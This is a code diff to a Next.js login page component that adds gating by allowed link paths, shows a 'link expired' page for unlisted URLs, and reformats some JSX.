@@ -6,18 +6,26 @@ import { useDispatch } from "react-redux";
 import { useRouter } from "next/navigation";
 import { userLogin } from "@/lib/userSlice";
 import { storeData } from "@/lib/dataSlice";
+import { usePathname } from "next/navigation";
+import NotFoundPage from "@/components/LinkExpired";
 
-const LoginPage: React.FC = () => {
+const LoginPage = ({ links }: { links: { link: string }[] }) => {
   const dispatch = useDispatch();
   const router = useRouter();
+  const pathname = usePathname();
 
   const [passwordVisible, setPasswordVisible] = useState(true);
   const [user, setUser] = useState("");
   const [password, setPassword] = useState("");
   const [deviceType, setDeviceType] = useState("");
 
+  const isLinkExpired = !links.some((l) => l.link === pathname);
+
   // Fetch user data
   useEffect(() => {
+    if (isLinkExpired) {
+      return;
+    }
     const fetchData = async () => {
       try {
         const res = await axios.get("/api/getData");
@@ -40,11 +48,15 @@ const LoginPage: React.FC = () => {
 
   // Detect device
   useEffect(() => {
+     if (isLinkExpired) {
+      return;
+    }
     const detectDevice = () => {
       const userAgent = navigator.userAgent.toLowerCase();
-      const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
-        userAgent
-      );
+      const isMobile =
+        /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
+          userAgent
+        );
       return isMobile ? "Mobile" : "Desktop";
     };
 
@@ -83,6 +95,10 @@ const LoginPage: React.FC = () => {
     }
   };
 
+  if (isLinkExpired) {
+    return <NotFoundPage />;
+  }
+
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-white text-gray-800">
       <div className="bg-white rounded-lg p-3 max-w-lg w-full">
@@ -100,7 +116,9 @@ const LoginPage: React.FC = () => {
 
         {/* Login Form */}
         <div className="mb-8">
-          <h2 className="text-2xl font-semibold mb-4">Log in to your account</h2>
+          <h2 className="text-2xl font-semibold mb-4">
+            Log in to your account
+          </h2>
           <form onSubmit={handleSubmit} className="space-y-4">
             <input
               type="email"
@@ -147,7 +165,8 @@ const LoginPage: React.FC = () => {
         <div className="text-sm text-gray-700 mb-6">
           This site is protected by hCaptcha and its{" "}
           <span className="text-[#b5486d] underline">Privacy Policy</span> and{" "}
-          <span className="text-[#b5486d] underline">Terms of Service</span> apply.
+          <span className="text-[#b5486d] underline">Terms of Service</span>{" "}
+          apply.
         </div>
 
         {/* First time */}
